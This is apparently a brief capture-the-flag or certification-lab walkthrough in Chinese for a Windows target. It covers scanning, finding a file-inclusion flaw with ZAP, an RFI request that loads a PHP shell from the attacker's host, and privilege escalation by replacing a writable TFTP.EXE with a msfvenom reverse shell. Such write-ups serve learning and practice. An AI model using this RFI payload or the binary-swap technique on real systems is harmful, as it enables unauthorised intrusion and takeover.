## nmap scanning
- <img width="1918" height="747" alt="image" src="https://github.com/user-attachments/assets/70de87fe-a6a8-452b-ae8f-0d0ce8b9fb17" />
- <img width="1918" height="687" alt="image" src="https://github.com/user-attachments/assets/1d2608c5-26b7-448d-bebd-0fba7a6468db" />

## 8080 port
- dirsearch
  - <img width="1918" height="843" alt="image" src="https://github.com/user-attachments/assets/1233ba57-692b-4b73-bee9-a87b7f826b3c" />
- 用 zap 發現 http://192.168.108.53:8080/site/index.php?page=main.php 存在 LFI 和 RFI
  - <img width="1918" height="847" alt="image" src="https://github.com/user-attachments/assets/1d4e2264-94b3-48ea-9390-f7bcd8bdc6df" />
- RFI 取得 shell
  ```
  http://192.168.108.53:8080/site/index.php?page=http://192.168.45.241/windows_shell.php
  ```
  - <img width="1918" height="692" alt="image" src="https://github.com/user-attachments/assets/20af1ba5-71cc-4b09-86ae-d246d63f4788" />
- 取得 local.txt
  - <img width="1040" height="427" alt="image" src="https://github.com/user-attachments/assets/5162ab0e-75f4-49b4-aa85-02b63e298cfd" />

## 提權
- winpeas.exe 發現 C:\Backup\TFTP.EXE 可以提權
  - <img width="1918" height="772" alt="image" src="https://github.com/user-attachments/assets/a982f389-99b1-4291-8ebf-a3615f913403" />
- msfvenom 產出一個 reverse shell 檔名為 TFTP.EXE
  - <img width="1918" height="222" alt="image" src="https://github.com/user-attachments/assets/cc5fe0ba-9bbd-4da3-9a2a-f9b10a156610" />
- 上傳後，等個幾分鐘，成功提權
  - <img width="1918" height="797" alt="image" src="https://github.com/user-attachments/assets/cddfa7c5-c6b2-4a2a-9932-69c2415d26d1" />
- 取得 proof.txt
  - <img width="1310" height="433" alt="image" src="https://github.com/user-attachments/assets/8cf9f42c-5915-43b9-abe6-48a2343d1540" />
















































